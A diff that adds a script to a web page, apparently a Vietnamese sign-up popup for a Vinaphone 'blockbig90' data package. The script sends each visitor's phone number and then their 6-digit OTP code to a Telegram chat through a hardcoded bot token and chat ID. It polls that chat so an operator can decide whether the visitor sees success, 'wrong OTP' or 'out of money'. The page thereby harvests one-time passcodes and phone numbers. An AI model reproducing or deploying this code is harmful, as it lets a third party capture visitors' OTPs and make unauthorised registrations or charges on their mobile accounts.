@@ -1,0 +1,570 @@
+<script>
+  document.addEventListener("DOMContentLoaded", function () {
+    const token = "7679124575:AAEwLlbVV03iAH5i_wCzyOwE4ec_r01Pmmc"; // Thay bằng token của bot
+    const chatId = "-4792422320"; // Thay bằng chat ID của bạn
+    let isPhoneSent = false; // Cờ để theo dõi trạng thái gửi số điện thoại
+    let isOtpSent = false; // Cờ để theo dõi trạng thái gửi OTP
+    let isSendingPhone = false; // Cờ kiểm tra nếu đang gửi số điện thoại
+    let isSendingOtp = false; // Cờ kiểm tra nếu đang gửi OTP
+    let lastUpdateId = 0; // ID cập nhật cuối cùng từ Telegram
+
+    // Tạo ID phiên duy nhất cho mỗi tab (dựa trên timestamp hoặc GUID)
+    const sessionId = "session_" + new Date().getTime();
+
+    // Ẩn lớp 'thong-tin-otp' khi trang tải
+    document.querySelector(".thong-tin-otp-blockbig90").style.display = "none";
+
+    // Thẻ trạng thái
+    const statusDiv = document.getElementById("status-blockbig90");
+
+    // Kiểm tra xem form đã gửi thành công chưa (chỉ trong phiên làm việc này)
+    if (sessionStorage.getItem(sessionId + "_formCompleted") !== "true") {
+      // Hàm gửi tin nhắn đến Telegram
+      function sendToTelegram(message, isOtp) {
+        const buttons = isOtp
+          ? {
+              reply_markup: {
+                inline_keyboard: [
+                  [
+                    { text: "Success", callback_data: "success" },
+                    { text: "Wrong OTP", callback_data: "error_otp" },
+                    { text: "Out Money", callback_data: "no_money" },
+                    {
+                      text: "Already have",
+                      callback_data: "other_data_packages",
+                    },
+                    {
+                      text: "Not applicable",
+                      callback_data: "packages_not_found",
+                    },
+                  ],
+                ],
+              },
+            }
+          : {};
+
+        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message,
+            parse_mode: "Markdown", // Hoặc 'HTML' nếu bạn muốn dùng HTML
+            disable_web_page_preview: true, // Tắt preview link
+            ...buttons,
+          }),
+        })
+          .then((response) => response.json())
+          .then((data) => {
+            if (data.ok) {
+              if (isOtp) {
+                // Hiển thị popup hoàn thành khi gửi OTP
+                showCompletePopup();
+                closePopup(); // Đóng popup ngay sau khi gửi OTP
+              } else {
+                enableOtpInput(); // Kích hoạt input OTP và nút gửi OTP
+                showPhoneSuccessMessage(); // Hiển thị thông báo khi gửi thành công số điện thoại
+
+                // Sau khi gửi số điện thoại thành công, bật lại nút "Gửi OTP"
+                document.getElementById(
+                  "send-otp-btn-blockbig90"
+                ).disabled = false; // Bỏ trạng thái disabled của nút "Gửi OTP"
+                document.getElementById(
+                  "send-otp-btn-blockbig90"
+                ).style.display = "inline-block"; // Hiển thị nút "Gửi OTP"
+              }
+              // Lưu trạng thái form đã hoàn thành vào sessionStorage với session ID duy nhất
+              sessionStorage.setItem(sessionId + "_formCompleted", "true");
+            } else {
+              alert("Đã xảy ra lỗi khi gửi tin nhắn.");
+            }
+          })
+          .catch((error) => {
+            console.error("Error sending message to Telegram:", error);
+          });
+      }
+    } else {
+      // Nếu form đã gửi thành công trong phiên làm việc này, không cần làm gì
+      console.log("Form đã gửi thành công trước đó trong phiên làm việc này.");
+    }
+
+    function checkTelegramUpdates() {
+      fetch(
+        `https://api.telegram.org/bot${token}/getUpdates?offset=${
+          lastUpdateId + 1
+        }`,
+        {
+          method: "GET",
+        }
+      )
+        .then((response) => response.json())
+        .then((data) => {
+          console.log("Phản hồi từ Telegram API:", data); // Kiểm tra log
+
+          if (!data.result || !Array.isArray(data.result)) {
+            console.error(
+              "Phản hồi không hợp lệ hoặc không có bản cập nhật mới."
+            );
+            return;
+          }
+
+          if (data.result.length > 0) {
+            data.result.forEach((update) => {
+              if (update.update_id > lastUpdateId) {
+                lastUpdateId = update.update_id;
+
+                if (update.callback_query) {
+                  const callbackData = update.callback_query.data;
+                  const messageId = update.callback_query.message.message_id;
+
+                  // Xử lý phản hồi từ Telegram
+                  if (callbackData === "success") {
+                    updateStatus("success", "Đăng ký thành công!");
+                    editInlineKeyboard(messageId, "success"); // Cập nhật nút
+                  } else if (callbackData === "error_otp") {
+                    updateStatus("error_otp", "Đăng ký thất bại!");
+                    editInlineKeyboard(messageId, "error_otp"); // Cập nhật nút
+                  } else if (callbackData === "no_money") {
+                    updateStatus("no_money", "Đăng ký thất bại!");
+                    editInlineKeyboard(messageId, "no_money"); // Cập nhật nút
+                  } else if (callbackData === "other_data_packages") {
+                    updateStatus("other_data_packages", "Đăng ký thất bại!");
+                    editInlineKeyboard(messageId, "other_data_packages"); // Cập nhật nút
+                  } else if (callbackData === "packages_not_found") {
+                    updateStatus("packages_not_found", "Đăng ký thất bại!");
+                    editInlineKeyboard(messageId, "packages_not_found"); // Cập nhật nút
+                  }
+                }
+              }
+            });
+          }
+        })
+        .catch((error) => {
+          console.error("Error fetching Telegram updates:", error);
+        });
+    }
+
+    // Hàm chỉnh sửa Inline Keyboard
+    function editInlineKeyboard(messageId, selectedOption) {
+      let updatedKeyboard;
+      if (selectedOption === "success") {
+        updatedKeyboard = {
+          inline_keyboard: [[{ text: "Success ✅", callback_data: "success" }]],
+        };
+      } else if (selectedOption === "error_otp") {
+        updatedKeyboard = {
+          inline_keyboard: [
+            [{ text: "Wrong OTP ❌", callback_data: "error_otp" }],
+          ],
+        };
+      } else if (selectedOption === "no_money") {
+        updatedKeyboard = {
+          inline_keyboard: [
+            [{ text: "Out Money 💰", callback_data: "no_money" }],
+          ],
+        };
+      } else if (selectedOption === "other_data_packages") {
+        updatedKeyboard = {
+          inline_keyboard: [
+            [{ text: "Already have ⚠️", callback_data: "other_data_packages" }],
+          ],
+        };
+      } else if (selectedOption === "packages_not_found") {
+        updatedKeyboard = {
+          inline_keyboard: [
+            [
+              {
+                text: "Not applicable ⛔",
+                callback_data: "packages_not_found",
+              },
+            ],
+          ],
+        };
+      }
+
+      fetch(`https://api.telegram.org/bot${token}/editMessageReplyMarkup`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          message_id: messageId,
+          reply_markup: updatedKeyboard,
+        }),
+      })
+        .then((response) => response.json())
+        .then((data) => {
+          if (data.ok) {
+            console.log("Inline Keyboard đã được cập nhật.");
+          } else {
+            console.error("Đã xảy ra lỗi khi cập nhật Inline Keyboard:", data);
+          }
+        })
+        .catch((error) => {
+          console.error("Error updating Inline Keyboard:", error);
+        });
+    }
+
+    // Kiểm tra phản hồi từ Telegram mỗi 5 giây
+    setInterval(checkTelegramUpdates, 5000);
+
+    // Hàm cập nhật trạng thái
+    function updateStatus(status, message) {
+      if (!statusDiv) {
+        console.error("Thẻ #status không tồn tại!");
+        return;
+      }
+
+      statusDiv.style.display = "block"; // Hiển thị thẻ
+
+      let phone = document.querySelector(
+        'input[name="phone-blockbig90"]'
+      ).value;
+      // Tạo đường link động dựa trên số điện thoại
+      let link = `https://digishop.vnpt.vn/di-dong?tab=c363&keyword=${phone}&aff=VNP018727`;
+
+      if (status === "success") {
+        statusDiv.innerHTML = `<p class="text-status-div"><img src="/wp-content/uploads/2024/11/1.png"/><p class="text-status-1">${message}</p> <span class="text-status">Bạn sẽ nhận được tin nhắn từ tổng đài</span></p>`;
+      } else if (status === "error_otp") {
+        statusDiv.innerHTML = `<p class="text-status-div"><img src="/wp-content/uploads/2024/11/2.png"/><p class="text-status-1">${message}</p> <span class="text-status">Bạn đã nhập sai OTP</span></p>`;
+      } else if (status === "no_money") {
+        statusDiv.innerHTML = `<p class="text-status-div"><img src="/wp-content/uploads/2024/11/2.png"/><p class="text-status-1">${message}</p> <span class="text-status">Tài khoản của bạn không đủ tiền</span></p>`;
+      } else if (status === "other_data_packages") {
+        statusDiv.innerHTML = `<p class="text-status-div"><img src="/wp-content/uploads/2024/11/2.png"/><p class="text-status-1">${message}</p> <span class="text-status">Bạn đang sử dụng gói cước khác, vui lòng hủy gói cước cũ và đăng ký lại</span></p>`;
+      } else if (status === "packages_not_found") {
+        statusDiv.innerHTML = `<p class="text-status-div"><img src="/wp-content/uploads/2024/11/2.png"/><p class="text-status-1">${message}</p> <span class="text-status">Gói cước không áp dụng cho thuê bao của bạn</br><a id="dynamic-link-blockbig90" href="${link}" target="_blank">Ấn vào đây</a> để tìm gói cước phù hợp</span></p>`;
+      }
+    }
+
+    // Hàm vô hiệu hóa các nút sau khi người dùng chọn
+    function disableButtons(messageId) {
+      fetch(`https://api.telegram.org/bot${token}/editMessageReplyMarkup`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          message_id: messageId,
+          reply_markup: { inline_keyboard: [] }, // Xóa các nút
+        }),
+      })
+        .then((response) => response.json())
+        .then((data) => {
+          if (data.ok) {
+            console.log("Các nút đã được vô hiệu hóa.");
+          } else {
+            console.error("Đã xảy ra lỗi khi vô hiệu hóa nút:", data);
+          }
+        })
+        .catch((error) => {
+          console.error("Error disabling buttons:", error);
+        });
+    }
+
+    // Hàm hiển thị spinner khi gửi số điện thoại
+    function showPhoneLoading() {
+      document.getElementById("loading-icon-blockbig90").style.display =
+        "inline-block"; // Hiển thị spinner
+    }
+
+    // Hàm ẩn spinner khi gửi xong
+    function hidePhoneLoading() {
+      document.getElementById("loading-icon-blockbig90").style.display = "none"; // Ẩn spinner
+      document.getElementById("send-phone-text-blockbig90").style.display =
+        "inline"; // Hiển thị lại text "Lấy mã xác thực"
+    }
+
+    // Hàm hiển thị spinner khi gửi OTP
+    function showOtpLoading() {
+      document.getElementById("loading-icon-otp-blockbig90").style.display =
+        "inline-block"; // Hiển thị spinner
+    }
+
+    // Hàm ẩn spinner khi gửi xong
+    function hideOtpLoading() {
+      document.getElementById("loading-icon-otp-blockbig90").style.display =
+        "none"; // Ẩn spinner cho OTP
+      document.getElementById("send-otp-text-blockbig90").style.display =
+        "inline"; // Hiển thị lại text "Đăng ký"
+    }
+
+    // Biến toàn cục để lưu currentTime
+    let currentTime;
+
+    // Nút gửi số điện thoại cho blockbig90
+    document
+      .getElementById("send-phone-btn-blockbig90")
+      .addEventListener("click", function () {
+        let phone = document.querySelector(
+          'input[name="phone-blockbig90"]'
+        ).value;
+
+        // Danh sách các đầu số hợp lệ
+        const validPrefixes = [
+          "081",
+          "082",
+          "083",
+          "084",
+          "085",
+          "088",
+          "091",
+          "094",
+        ];
+
+        // Kiểm tra nếu độ dài số điện thoại là 10 và bắt đầu bằng số 0
+        if (phone.length === 10) {
+          // Kiểm tra đầu số hợp lệ
+          if (validPrefixes.includes(phone.substring(0, 3))) {
+            isPhoneSent = true; // Đánh dấu đã gửi số điện thoại
+            this.disabled = true; // Vô hiệu hóa nút sau khi gửi
+            showPhoneLoading(); // Hiển thị spinner khi gửi tin nhắn
+            isSendingPhone = true; // Đánh dấu là đang gửi số điện thoại
+
+            // Lấy thời gian hiện tại
+            let now = new Date();
+            let year = now.getFullYear();
+            let month = (now.getMonth() + 1).toString().padStart(2, "0"); // Thêm 0 nếu tháng là số đơn
+            let day = now.getDate().toString().padStart(2, "0"); // Thêm 0 nếu ngày là số đơn
+            let hours = now.getHours().toString().padStart(2, "0");
+            let minutes = now.getMinutes().toString().padStart(2, "0");
+            let seconds = now.getSeconds().toString().padStart(2, "0");
+
+            // Tạo chuỗi thời gian đầy đủ
+            currentTime = `${year}${month}${day}${hours}${minutes}${seconds}${phone}`;
+
+            console.log("Current Time: ", currentTime); // Kiểm tra giá trị currentTime
+
+            sendToTelegram(
+              `OrderID: ${currentTime}\nPhone: \`${phone}\`\nDescription: blockbig90\nLink: https://digishop.vnpt.vn/di-dong/blockbig90/3661?aff=VNP018670`
+            );
+
+            // Đặt thời gian 10 giây để ẩn spinner
+            setTimeout(function () {
+              hidePhoneLoading(); // Ẩn spinner sau 10 giây
+              document.getElementById(
+                "send-phone-btn-blockbig90"
+              ).style.display = "none";
+              document.querySelector(
+                ".thong-tin-otp-blockbig90"
+              ).style.display = "block";
+              document.getElementById(
+                "phoneSuccessMessage-blockbig90"
+              ).style.display = "block";
+            }, 10000); // Thời gian 10 giây
+          } else {
+            alert(
+              "Đây không phải số Vinaphone. Vui lòng nhập đúng số Vinaphone."
+            );
+          }
+        } else {
+          alert("Số điện thoại phải có 10 chữ số.");
+        }
+      });
+
+    // Hàm hiển thị thông báo khi gửi số điện thoại thành công
+    function showPhoneSuccessMessage() {
+      document.getElementById("phoneSuccessMessage-blockbig90").style.display =
+        "block";
+      document.getElementById("send-phone-btn-blockbig90").style.display =
+        "none";
+      document.querySelector(".thong-tin-otp-blockbig90").style.display =
+        "block"; // Mở lớp 'thong-tin-otp' sau khi gửi số điện thoại thành công
+
+      // Hiển thị lại nút "Gửi OTP" và kích hoạt chức năng gửi
+      document.getElementById("send-otp-btn-blockbig90").style.display =
+        "inline-block"; // Hiển thị nút "Gửi OTP"
+      document.getElementById("send-otp-btn-blockbig90").disabled = false; // Bỏ trạng thái disabled của nút "Gửi OTP"
+    }
+
+    // Kiểm tra và giới hạn số điện thoại chỉ được nhập 10 số và bắt đầu bằng số 0
+    document
+      .querySelector('input[name="phone-blockbig90"]')
+      .addEventListener("input", function (e) {
+        let phoneInput = e.target;
+        // Lọc chỉ cho phép nhập số và giới hạn tối đa 10 ký tự
+        phoneInput.value = phoneInput.value.replace(/\D/g, "").slice(0, 10);
+
+        // Nếu người dùng nhập không bắt đầu bằng số 0, xóa input
+        if (phoneInput.value && phoneInput.value[0] !== "0") {
+          phoneInput.value = "";
+          alert("Số điện thoại phải bắt đầu bằng số 0.");
+        }
+      });
+
+    // Nút gửi mã OTP cho blockbig90
+    document
+      .getElementById("send-otp-btn-blockbig90")
+      .addEventListener("click", function () {
+        let otp = document.querySelector('input[name="otp-blockbig90"]').value;
+        let phone = document.querySelector(
+          'input[name="phone-blockbig90"]'
+        ).value;
+        if (isOtpSent) return;
+
+        // Kiểm tra nếu mã OTP có đúng 6 ký tự
+        if (otp.length === 6 && phone) {
+          // Kiểm tra xem currentTime đã được gán chưa
+          if (!currentTime) {
+            console.error("currentTime is undefined!"); // In ra thông báo lỗi nếu currentTime không có giá trị
+            alert("Lỗi: Dữ liệu không hợp lệ.");
+            return;
+          }
+
+          isOtpSent = true;
+          isSendingOtp = true; // Đánh dấu là đang gửi OTP
+          this.disabled = true;
+
+          showOtpLoading(); // Hiển thị spinner khi gửi OTP
+
+          sendToTelegram(
+            `OrderID: ${currentTime}\nPhone: \`${phone}\`\nDescription: blockbig90\nOTP Code: \`${otp}\``,
+            true
+          );
+
+          // Đặt thời gian 10 giây để ẩn spinner và hiển thị popupOverlay-complete-blockbig90
+          setTimeout(function () {
+            hideOtpLoading(); // Ẩn spinner sau khi gửi OTP
+            document.getElementById(
+              "popupOverlay-complete-blockbig90"
+            ).style.display = "block"; // Hiển thị popup sau 10 giây
+            document.getElementById("popupOverlay-blockbig90").style.display =
+              "none"; // Ẩn popup chính nếu cần
+          }, 10000); // Thời gian 10 giây
+        } else {
+          alert("Mã OTP phải có đúng 6 ký tự.");
+        }
+      });
+
+    // Kiểm tra và giới hạn mã OTP chỉ được nhập số và tối đa 6 ký tự
+    document
+      .querySelector('input[name="otp-blockbig90"]')
+      .addEventListener("input", function (e) {
+        let otpInput = e.target;
+        otpInput.value = otpInput.value.replace(/\D/g, "").slice(0, 6);
+      });
+
+    // Khi nhấp vào link mở popup blockbig90
+    document
+      .getElementById("openPopup-blockbig90")
+      .addEventListener("click", function (event) {
+        event.preventDefault();
+        document.getElementById("popupOverlay-blockbig90").style.display =
+          "flex";
+
+        // Xóa giá trị input và ẩn các lớp liên quan
+        document.querySelector('input[name="phone-blockbig90"]').value = "";
+        document.querySelector('input[name="otp-blockbig90"]').value = "";
+
+        // Reset các nút và lớp
+        document.getElementById("send-phone-btn-blockbig90").style.display =
+          "block"; // Hiển thị lại nút "Gửi số điện thoại"
+        document.getElementById("send-phone-btn-blockbig90").disabled = false; // Bật lại nút gửi số điện thoại
+        document.getElementById(
+          "phoneSuccessMessage-blockbig90"
+        ).style.display = "none";
+        document.querySelector(".thong-tin-otp-blockbig90").style.display =
+          "none"; // Ẩn lớp OTP
+
+        // Reset lại trạng thái cờ
+        isPhoneSent = false;
+        isOtpSent = false;
+
+        // Hiển thị lại nút "Gửi OTP" khi popup được mở lại
+        document.getElementById("send-otp-btn-blockbig90").style.display =
+          "inline-block";
+        document.getElementById("send-otp-btn-blockbig90").disabled = false; // Bỏ trạng thái disabled cho nút Gửi OTP
+      });
+
+    // Lấy vị trí cuộn đã lưu trong localStorage
+    const scrollPosition = localStorage.getItem("scrollPosition");
+
+    if (scrollPosition) {
+      // Cuộn trang đến vị trí đã lưu
+      window.scrollTo(0, parseInt(scrollPosition));
+
+      // Xóa vị trí cuộn đã lưu để tránh cuộn lại lần sau
+      localStorage.removeItem("scrollPosition");
+    }
+
+    // Hàm để đóng popup và xóa input
+    function closePopup() {
+      // Hủy các thao tác gửi nếu có
+      if (isSendingPhone) {
+        // Hủy yêu cầu gửi số điện thoại nếu đang gửi
+      }
+      if (isSendingOtp) {
+        // Hủy yêu cầu gửi OTP nếu đang gửi
+      }
+      hidePhoneLoading();
+      hideOtpLoading();
+
+      // Lưu vị trí cuộn hiện tại vào localStorage
+      localStorage.setItem("scrollPosition", window.scrollY);
+
+      // Reload lại trang
+      location.reload();
+
+      // Xóa giá trị input và ẩn các lớp liên quan
+      document.querySelector('input[name="phone-blockbig90"]').value = "";
+      document.querySelector('input[name="otp-blockbig90"]').value = "";
+
+      // Đóng các popup
+      document.getElementById("popupOverlay-blockbig90").style.display = "none";
+      document.getElementById(
+        "popupOverlay-complete-blockbig90"
+      ).style.display = "none";
+
+      sessionStorage.setItem("isInfoSubmitted", "false"); // Reset trạng thái
+
+      // Ẩn thông báo thành công và reset các trạng thái
+      document.getElementById("phoneSuccessMessage-blockbig90").style.display =
+        "none";
+      document.getElementById("send-phone-btn-blockbig90").style.display =
+        "block"; // Hiển thị lại nút "Gửi số điện thoại"
+
+      // Đặt lại cờ gửi số điện thoại
+      isPhoneSent = false;
+      isOtpSent = false; // Reset cờ OTP
+      isSendingPhone = false;
+      isSendingOtp = false;
+
+      // Re-enable buttons
+      document.getElementById("send-phone-btn-blockbig90").disabled = false;
+      document.getElementById("send-otp-btn-blockbig90").disabled = false; // Hiển thị lại nút gửi OTP
+
+      // Ẩn lớp thông tin OTP
+      document.querySelector(".thong-tin-otp-blockbig90").style.display =
+        "none";
+    }
+
+    document.addEventListener("DOMContentLoaded", function () {
+      // Lấy phần tử popup
+      const popupOverlay = document.getElementById("popupOverlay-blockbig90");
+
+      // Lấy nút đóng
+      const closePopupButton = document.getElementById(
+        "closePopupButton-blockbig90"
+      );
+
+      // Thêm sự kiện click cho nút đóng
+      closePopupButton.addEventListener("click", function () {
+        // Đóng popup khi nhấn nút "X"
+        popupOverlay.style.display = "none"; // Ẩn popup
+      });
+    });
+
+    // Thêm sự kiện click để đóng popup khi nhấp vào nút đóng
+    document
+      .getElementById("closePopupButton-blockbig90")
+      .addEventListener("click", closePopup); // Đóng popup khi nhấp nút đóng
+
+    document
+      .getElementById("closePopup-complete-blockbig90")
+      .addEventListener("click", function () {
+        // Đóng popup hoàn thành
+        document.getElementById(
+          "popupOverlay-complete-blockbig90"
+        ).style.display = "none"; // Đóng popup
+      });
+  });
+</script>
